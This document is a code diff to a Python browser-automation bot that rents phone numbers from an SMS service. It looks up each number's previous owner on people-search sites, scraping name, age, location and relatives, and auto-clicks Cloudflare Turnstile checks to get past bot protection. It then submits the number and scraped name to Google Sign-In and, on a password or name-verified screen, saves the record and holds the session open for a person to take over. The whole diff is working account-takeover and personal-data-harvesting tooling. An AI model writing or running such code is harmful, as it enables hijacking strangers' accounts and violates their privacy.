@@ -270,51 +270,76 @@ class SMSBowerBot:
 
                             if not self.is_running: break
 
-                            # Step 8: FamilyTreeNow Search
-                            self.log(f"Step 8: Searching FamilyTreeNow for number: {phone_10}...")
-                            ftn_page = await context.new_page()
-                            ftn_data = await self._search_familytreenow(ftn_page, phone_10)
-                            await ftn_page.close()
+                            # Step 8: Search ONLY FastPeopleSearch
+                            self.log(f"Step 8: Searching FastPeopleSearch for number: {phone_10}...")
+                            fps_page = await context.new_page()
+                            fps_data = await self._search_fastpeoplesearch(fps_page, phone_10)
+                            await fps_page.close()
 
                             if not self.is_running: break
 
-                            google_status = "Not Tested"
-                            if ftn_data.get("found"):
-                                self.log(f"-> 🎯 MATCH FOUND ON FAMILYTREENOW! Name: {ftn_data.get('name')}, Age: {ftn_data.get('age')}, Location: {ftn_data.get('location')}")
-                                
-                                # Step 9: Test Google Sign-In verification
-                                self.log("Step 9: Verifying Google Sign-In with acquired number...")
-                                google_page = await context.new_page()
-                                google_status = await self._verify_google_signin(google_page, phone_number)
-                                await google_page.close()
-                                self.log(f"-> Google Sign-In Status: {google_status}")
+                            # POINT 1 & 2: If NO name/record found on FastPeopleSearch -> Immediately CANCEL order on SMSBower & Get Next Number!
+                            if not fps_data.get("found") or not fps_data.get("name"):
+                                self.log(f"❌ No matching name record found on FastPeopleSearch for {phone_10}.")
+                                self.log("👉 Cancelling active order on SMSBower cabinet ($0 cost refund) and fetching new number...")
+                                cancelled = await self._cancel_order(page, order_id)
+                                if cancelled:
+                                    self.cancelled_cost += 1
+                                    self.log(f"-> Order successfully cancelled! Total $0 refund cancellations: {self.cancelled_cost}")
+                                await self._sleep_check(1)
+                                continue  # REPEAT LOOP FOR NEW NUMBER!
 
-                                # Save complete record
+                            # MATCH FOUND ON FASTPEOPLESEARCH!
+                            extracted_name = fps_data.get("name", "")
+                            self.log(f"-> 🎯 MATCH FOUND ON FASTPEOPLESEARCH! Name: '{extracted_name}', Age: {fps_data.get('age')}, Location: {fps_data.get('location')}")
+
+                            if not self.is_running: break
+
+                            # Step 9: Verify Google Sign-In with acquired number & name
+                            self.log("Step 9: Testing Google Sign-In with acquired number & FastPeopleSearch name...")
+                            google_page = await context.new_page()
+                            google_res = await self._verify_google_signin_flow(google_page, phone_number, extracted_name)
+
+                            google_status = google_res.get("message", "FAILED")
+
+                            if google_res.get("status") in ["HOLD_DIRECT_PASSWORD", "HOLD_NAME_VERIFIED"]:
+                                # BINGO! Save Record & HOLD/PAUSE!
                                 record = database.save_record(
                                     phone=phone_number,
                                     order_id=order_id,
-                                    name=ftn_data.get("name", ""),
-                                    age=ftn_data.get("age", ""),
-                                    location=ftn_data.get("location", ""),
-                                    relatives=ftn_data.get("relatives", ""),
+                                    name=extracted_name,
+                                    age=fps_data.get("age", ""),
+                                    location=fps_data.get("location", ""),
+                                    relatives=fps_data.get("relatives", ""),
                                     google_status=google_status
                                 )
                                 self.records_saved += 1
                                 self.log(f"-> 💾 Record saved to database & CSV! Total saved: {self.records_saved}")
+                                self.log(f"⏸️ HOLDING BROWSER SESSION FOR USER ACTION ({google_status})...")
+                                self.current_status = "HOLD / ACTION REQUIRED"
+
+                                # Wait in Hold loop until user stops or closes
+                                while self.is_running and "HOLD" in self.current_status:
+                                    await self._sleep_check(1)
+
+                                try:
+                                    await google_page.close()
+                                except Exception:
+                                    pass
                             else:
-                                self.log(f"-> No matching personal record found on FamilyTreeNow for {phone_10}.")
-
-                            if not self.is_running: break
-
-                            # Step 10: SMSBower Cabinet Order Cancellation ($0 Cost Refund)
-                            self.log("Step 10: Cancelling active order on SMSBower cabinet ($0 net charge refund)...")
-                            cancelled = await self._cancel_order(page, order_id)
-                            if cancelled:
-                                self.cancelled_cost += 1
-                                self.log(f"-> Order successfully cancelled! Total $0 refund cancellations: {self.cancelled_cost}")
-
-                            self.log("Iteration complete. Fast cycle delay 0.5s...")
-                            await self._sleep_check(0.5)
+                                # POINT 3: Google Sign-In Next failed -> Cancel order on SMSBower & Get Next Number!
+                                self.log(f"❌ Google Sign-In could not proceed for {phone_number}.")
+                                try:
+                                    await google_page.close()
+                                except Exception:
+                                    pass
+                                self.log("👉 Cancelling active order on SMSBower cabinet ($0 cost refund) and fetching new number...")
+                                cancelled = await self._cancel_order(page, order_id)
+                                if cancelled:
+                                    self.cancelled_cost += 1
+                                    self.log(f"-> Order successfully cancelled! Total $0 refund cancellations: {self.cancelled_cost}")
+                                await self._sleep_check(1)
+                                continue
 
                             if self.target_numbers and self.numbers_checked >= self.target_numbers:
                                 self.log(f"Target count of {self.target_numbers} numbers checked. Batch workflow finished successfully!")
@@ -724,6 +749,137 @@ class SMSBowerBot:
 
         return "", ""
 
+    async def _search_fastpeoplesearch(self, page, phone_10):
+        phone_clean = re.sub(r"\D", "", phone_10)[-10:]
+        phone_formatted = f"{phone_clean[:3]}-{phone_clean[3:6]}-{phone_clean[6:]}" if len(phone_clean) == 10 else phone_clean
+        
+        url = "https://www.fastpeoplesearch.com/"
+        try:
+            self.log(f"Navigating to FastPeopleSearch homepage ({url}) for number: {phone_10}...")
+            await page.goto(url, wait_until="domcontentloaded", timeout=40000)
+            await asyncio.sleep(1.5)
+
+            if not self.headless:
+                try:
+                    await page.bring_to_front()
+                except Exception:
+                    pass
+
+            # Persistent Hybrid Wait Loop: Wait for Turnstile pass (auto-click + manual fallback)
+            max_captcha_attempts = 25  # Wait up to ~75 seconds
+            warned_user = False
+            for cf_attempt in range(max_captcha_attempts):
+                if not self.is_running:
+                    return {"found": False}
+
+                content_check = await page.content()
+                
+                # Check if Cloudflare Turnstile / Just a moment page is active
+                if "challenges.cloudflare.com" in content_check or "Just a moment..." in content_check or "Verify you are human" in content_check:
+                    if not warned_user:
+                        self.log("⚠️ CLOUDFLARE TURNSTILE DETECTED on FastPeopleSearch!")
+                        self.log("👉 Please click the Turnstile checkbox 1 TIME manually in the Chrome window if auto-pass takes time.")
+                        warned_user = True
+                    else:
+                        self.log(f"⏳ Waiting for Turnstile clearance... [{cf_attempt+1}/{max_captcha_attempts}]")
+                    
+                    try:
+                        turnstile_frame = page.frame(url=re.compile(r"challenges\.cloudflare\.com"))
+                        if turnstile_frame:
+                            cb = await turnstile_frame.query_selector("input[type='checkbox'], .ctp-checkbox_label, body")
+                            if cb:
+                                box = await cb.bounding_box()
+                                if box:
+                                    await page.mouse.move(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2, steps=6)
+                                    await asyncio.sleep(0.2)
+                                    await page.mouse.click(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
+                                else:
+                                    await cb.click()
+                    except Exception as cf_err:
+                        self.log(f"Turnstile auto-click note: {cf_err}")
+                    
+                    await asyncio.sleep(3)
+                else:
+                    self.log("✅ Cloudflare Turnstile CLEARED SUCCESSFULLY on FastPeopleSearch!")
+                    break
+
+            await asyncio.sleep(1)
+
+            # Step 2: Select PHONE option/tab on FastPeopleSearch
+            self.log("Selecting 'PHONE' reverse lookup option tab on FastPeopleSearch...")
+            phone_tab = page.locator("#search-nav-link-phone, a[data-target='#search-type-container-phone'], text='PHONE'")
+            if await phone_tab.first.is_visible():
+                await phone_tab.first.click()
+                await asyncio.sleep(0.5)
+
+            # Step 3: Fill phone number input field & submit form
+            self.log(f"Filling phone number {phone_formatted} into FastPeopleSearch input field...")
+            phone_inp = page.locator("#search-phone-phone, input[name='phone']").first
+            if await phone_inp.is_visible():
+                await phone_inp.fill(phone_formatted)
+                await asyncio.sleep(0.5)
+                
+                submit_btn = page.locator("#form-search-phone button[type='submit'], #form-search-phone .search-form-button-submit").first
+                if await submit_btn.is_visible():
+                    self.log("Clicking FastPeopleSearch Free Search button...")
+                    await submit_btn.click()
+                    await asyncio.sleep(3)
+            else:
+                self.log(f"Direct phone URL fallback: https://www.fastpeoplesearch.com/phone/{phone_formatted}")
+                await page.goto(f"https://www.fastpeoplesearch.com/phone/{phone_formatted}", wait_until="domcontentloaded", timeout=40000)
+
+            # Step 4: Secondary Turnstile check on results page if triggered
+            for cf_attempt in range(max_captcha_attempts):
+                if not self.is_running:
+                    return {"found": False}
+
+                content_check = await page.content()
+                if "challenges.cloudflare.com" in content_check or "Just a moment..." in content_check or "Verify you are human" in content_check:
+                    if not warned_user:
+                        self.log("⚠️ CLOUDFLARE TURNSTILE DETECTED on FastPeopleSearch Results!")
+                        self.log("👉 Please click Turnstile checkbox manually in Chrome window if needed.")
+                        warned_user = True
+                    await asyncio.sleep(3)
+                else:
+                    break
+
+            await asyncio.sleep(2.5)
+
+            content = await page.content()
+            soup = BeautifulSoup(content, "html.parser")
+            page_text = soup.get_text()
+
+            if "0 People Records" in page_text or "No records found" in page_text or "404" in page_text or "0 Records" in page_text:
+                self.log(f"FastPeopleSearch result: No matching record for {phone_10}.")
+                return {"found": False}
+
+            # Extract details from FastPeopleSearch results DOM
+            name_el = soup.select_one(".card-title, .record-name, a[href*='name'], h2.card-title, .people-card h2, a.link-to-details, h2, h3")
+            name = name_el.get_text(strip=True) if name_el else ""
+
+            age_el = soup.select_one(".age, span[class*='age']")
+            age = age_el.get_text(strip=True) if age_el else ""
+
+            loc_el = soup.select_one(".location, .address, span[class*='location'], a[href*='address']")
+            location = loc_el.get_text(strip=True) if loc_el else ""
+
+            relatives_els = soup.select("a[href*='name'], .relatives a, a[href*='relative']")
+            relatives = ", ".join([r.get_text(strip=True) for r in relatives_els[:5]]) if relatives_els else ""
+
+            if name or "Full Name" in page_text or "Current Address" in page_text:
+                return {
+                    "found": True,
+                    "name": name if name else "Person Record Found",
+                    "age": age,
+                    "location": location,
+                    "relatives": relatives,
+                    "source": "FastPeopleSearch"
+                }
+        except Exception as e:
+            self.log(f"FastPeopleSearch lookup warning: {e}")
+
+        return {"found": False}
+
     async def _search_familytreenow(self, page, phone_10):
         url = f"https://www.familytreenow.com/search/genealogy/results?searchtype=phone&phone={phone_10}"
         try:
@@ -731,57 +887,79 @@ class SMSBowerBot:
             await page.goto(url, wait_until="domcontentloaded", timeout=40000)
             await asyncio.sleep(2)
             
-            # Auto-click & solve Cloudflare Turnstile if encountered
-            for cf_attempt in range(6):
+            if not self.headless:
+                try:
+                    await page.bring_to_front()
+                except Exception:
+                    pass
+
+            # Persistent Hybrid Wait Loop: Wait for Turnstile pass (auto-click + manual fallback)
+            max_captcha_attempts = 25  # Wait up to ~75 seconds
+            warned_user = False
+            for cf_attempt in range(max_captcha_attempts):
+                if not self.is_running:
+                    return {"found": False}
+
                 content_check = await page.content()
-                if "challenges.cloudflare.com" not in content_check and "Just a moment..." not in content_check:
-                    self.log("Cloudflare Turnstile cleared successfully!")
+                
+                # Check if Cloudflare Turnstile / Just a moment page is active
+                if "challenges.cloudflare.com" in content_check or "Just a moment..." in content_check or "Verify you are human" in content_check:
+                    if not warned_user:
+                        self.log("⚠️ CLOUDFLARE TURNSTILE DETECTED on FamilyTreeNow!")
+                        self.log("👉 Please click the Turnstile checkbox 1 TIME manually in the Chrome window if auto-pass takes time.")
+                        warned_user = True
+                    else:
+                        self.log(f"⏳ Waiting for Turnstile clearance... [{cf_attempt+1}/{max_captcha_attempts}]")
+                    
+                    try:
+                        turnstile_frame = page.frame(url=re.compile(r"challenges\.cloudflare\.com"))
+                        if turnstile_frame:
+                            cb = await turnstile_frame.query_selector("input[type='checkbox'], .ctp-checkbox_label, body")
+                            if cb:
+                                box = await cb.bounding_box()
+                                if box:
+                                    await page.mouse.move(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2, steps=6)
+                                    await asyncio.sleep(0.2)
+                                    await page.mouse.click(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
+                                else:
+                                    await cb.click()
+                    except Exception as cf_err:
+                        self.log(f"Turnstile auto-click note: {cf_err}")
+                    
+                    await asyncio.sleep(3)
+                else:
+                    self.log("✅ Cloudflare Turnstile CLEARED SUCCESSFULLY!")
                     break
 
-                try:
-                    turnstile_frame = page.frame(url=re.compile(r"challenges\.cloudflare\.com"))
-                    if turnstile_frame:
-                        self.log(f"Attempt {cf_attempt+1}/6: Cloudflare challenge detected. Applying stealth click...")
-                        cb = await turnstile_frame.query_selector("input[type='checkbox'], .ctp-checkbox_label, body")
-                        if cb:
-                            box = await cb.bounding_box()
-                            if box:
-                                await page.mouse.move(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2, steps=8)
-                                await asyncio.sleep(0.4)
-                                await page.mouse.click(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
-                            else:
-                                await cb.click()
-                except Exception as cf_err:
-                    self.log(f"Turnstile click note: {cf_err}")
-
-                await asyncio.sleep(3)
-
-            # Extra wait for results page JS load
-            await asyncio.sleep(3)
+            # Extra wait for search results page DOM render
+            await asyncio.sleep(2.5)
 
             content = await page.content()
             soup = BeautifulSoup(content, "html.parser")
             page_text = soup.get_text()
-            
-            # If still stuck or empty form page, type number directly into search input
-            if "Just a moment..." in page_text or "Not enough criteria entered" in page_text or ("Search Criteria" in page_text and "0 People Records" not in page_text):
-                try:
-                    inp = await page.query_selector("input[name='phone'], input[placeholder*='phone'], #phone")
-                    if inp:
-                        self.log("Form search input found. Filling phone number directly...")
+
+            # Ensure phone number search is submitted if form is presented
+            try:
+                inp = await page.query_selector("input[name='phone'], input[placeholder*='phone'], #phone")
+                if inp:
+                    val = await inp.input_value()
+                    if not val or phone_10 not in val:
+                        self.log(f"Filling phone number {phone_10} into FamilyTreeNow input field...")
                         await inp.fill(phone_10)
                         await asyncio.sleep(0.5)
-                        btn = await page.query_selector("button:has-text('Search'), input[type='submit']")
+                        btn = await page.query_selector("button:has-text('Search'), input[type='submit'], .btn-primary")
                         if btn:
+                            self.log("Clicking FamilyTreeNow Search button...")
                             await btn.click()
                             await asyncio.sleep(4)
                             content = await page.content()
                             soup = BeautifulSoup(content, "html.parser")
                             page_text = soup.get_text()
-                except Exception as form_err:
-                    self.log(f"Form fallback note: {form_err}")
+            except Exception as form_err:
+                self.log(f"Form interaction note: {form_err}")
 
-            if "0 People Records" in page_text or "No records found" in page_text:
+            if "0 People Records" in page_text or "No records found" in page_text or "0 Records" in page_text:
+                self.log(f"FamilyTreeNow result: No matching record for {phone_10}.")
                 return {"found": False}
 
             # Extract details
@@ -797,7 +975,6 @@ class SMSBowerBot:
             relatives_els = soup.select(".relatives a, .relative-name, a[href*='relative']")
             relatives = ", ".join([r.get_text(strip=True) for r in relatives_els[:5]]) if relatives_els else ""
 
-            # Check if any person record text is on page
             if name or "Person Record" in page_text or "Living" in page_text:
                 return {
                     "found": True,
@@ -811,28 +988,128 @@ class SMSBowerBot:
 
         return {"found": False}
 
-    async def _verify_google_signin(self, page, phone_number):
+    def _emit_alert_whistle(self):
+        """Emit a loud whistle/beep sound alert on Windows system when a target account is hit."""
         try:
-            await page.goto("https://accounts.google.com/v3/signin/identifier", wait_until="domcontentloaded", timeout=30000)
+            import winsound
+            for frequency in [1500, 2000, 2500, 3000]:
+                winsound.Beep(frequency, 300)
+        except Exception:
+            try:
+                print("\a\a\a\a\a")
+            except Exception:
+                pass
+
+    def _clean_name(self, raw_name):
+        """Clean and split full name into first and last name neatly."""
+        if not raw_name:
+            return "", ""
+        cleaned = re.sub(r"(?i)\b(view|details|person|record|living|age|\d+)\b", "", raw_name)
+        cleaned = re.sub(r"[^\w\s]", " ", cleaned).strip()
+        parts = [p.capitalize() for p in cleaned.split() if len(p) > 1]
+        if not parts:
+            return "", ""
+        if len(parts) == 1:
+            return parts[0], parts[0]
+        first_name = parts[0]
+        last_name = " ".join(parts[1:])
+        return first_name, last_name
+
+    async def _verify_google_signin_flow(self, page, phone_number, name):
+        """
+        Interacts with Google Sign-In using phone number & FastPeopleSearch name.
+        """
+        try:
+            self.log(f"Navigating to Google Sign-In for phone number: {phone_number}...")
+            await page.goto("https://accounts.google.com/v3/signin/identifier", wait_until="domcontentloaded", timeout=35000)
             await asyncio.sleep(2)
 
-            inp = await page.query_selector("input[type='email'], input[name='identifier']")
-            if inp:
-                await inp.fill(phone_number)
-                await page.keyboard.press("Enter")
-                await asyncio.sleep(3)
+            # Step A: Locate Identifier input
+            inp = page.locator("input[type='email'], input[name='identifier'], #identifierId, input[aria-label*='Email']").first
+            if not await inp.is_visible():
+                self.log("Google Sign-In identifier input not found.")
+                return {"status": "FAILED", "message": "Identifier input not visible"}
 
-                content = await page.content()
-                if "Could not find your Google Account" in content or "Couldn't find your Google Account" in content:
-                    return "No Account Linked"
-                elif "Enter your password" in content or "challenge" in content:
-                    return "Active Google Account Found"
+            self.log(f"Entering phone number {phone_number} on Google Sign-In...")
+            await inp.fill(phone_number)
+            await asyncio.sleep(0.5)
+
+            # Click Next
+            next_btn = page.locator("#identifierNext, button:has-text('Next'), button:has-text('Далее')").first
+            if await next_btn.is_visible():
+                await next_btn.click()
+            else:
+                await page.keyboard.press("Enter")
+
+            await asyncio.sleep(3.5)
+
+            content = await page.content()
+            page_text = BeautifulSoup(content, "html.parser").get_text()
+
+            # Check if Error (No account linked / invalid number)
+            if any(err in content for err in [
+                "Could not find your Google Account",
+                "Couldn't find your Google Account",
+                "Enter a valid email or phone number",
+                "Try again with a different"
+            ]) or "Could not find your Google Account" in page_text:
+                self.log(f"❌ Google Sign-In error: No account linked for number {phone_number}.")
+                return {"status": "FAILED", "message": "No Google Account Linked"}
+
+            # Sub-case 1: Directly asks for Password
+            pwd_field = page.locator("input[type='password'], input[name='Passwd'], #password").first
+            if (await pwd_field.is_visible() if await pwd_field.count() > 0 else False) or "Enter your password" in content or "Confirm your password" in content:
+                self.log("============================================================")
+                self.log(f"🚨 BINGO! Google directly requested Password for {phone_number}!")
+                self.log("============================================================")
+                self._emit_alert_whistle()
+                return {"status": "HOLD_DIRECT_PASSWORD", "message": "Active Account - Direct Password Requested"}
+
+            # Sub-case 2: Asks for Name (First Name & Last Name)
+            fname_field = page.locator("input[name='firstName'], #firstName").first
+            lname_field = page.locator("input[name='lastName'], #lastName").first
+
+            if (await fname_field.is_visible() if await fname_field.count() > 0 else False):
+                first_name, last_name = self._clean_name(name)
+                self.log(f"Google requested Name verification. Entering First Name: '{first_name}', Last Name: '{last_name}'...")
+                
+                await fname_field.fill(first_name)
+                if await lname_field.is_visible():
+                    await lname_field.fill(last_name)
+
+                await asyncio.sleep(0.5)
+
+                name_next_btn = page.locator("#collectNameNext, #next, button:has-text('Next')").first
+                if await name_next_btn.is_visible():
+                    await name_next_btn.click()
                 else:
-                    return "Identifier Submitted"
+                    await page.keyboard.press("Enter")
+
+                await asyncio.sleep(3.5)
+
+                content_after = await page.content()
+                if not any(err in content_after for err in ["Wrong name", "Try again", "Could not verify"]):
+                    self.log("============================================================")
+                    self.log(f"🚨 BINGO! Name verified successfully on Google for {phone_number} ({first_name} {last_name})!")
+                    self.log("============================================================")
+                    self._emit_alert_whistle()
+                    return {"status": "HOLD_NAME_VERIFIED", "message": "Active Account - Name Verified"}
+                else:
+                    self.log("❌ Name verification failed on Google Sign-In.")
+                    return {"status": "FAILED", "message": "Name verification failed"}
+
+            # Fallback check if password or verification screen loaded
+            if "password" in page.url.lower() or "challenge" in page.url.lower():
+                self.log(f"🚨 BINGO! Google Sign-In proceeded to verification/password for {phone_number}!")
+                self._emit_alert_whistle()
+                return {"status": "HOLD_DIRECT_PASSWORD", "message": "Active Account - Proceeded to Challenge"}
+
+            self.log(f"⚠️ Google Sign-In could not proceed past identifier for {phone_number}.")
+            return {"status": "FAILED", "message": "Identifier Next Failed"}
+
         except Exception as e:
-            self.log(f"Google Sign-In test note: {e}")
-            return "Test Error / Shielded"
-        return "Unknown"
+            self.log(f"Google Sign-In flow error: {e}")
+            return {"status": "FAILED", "message": str(e)}
 
     async def _cancel_order(self, page, order_id):
         try:
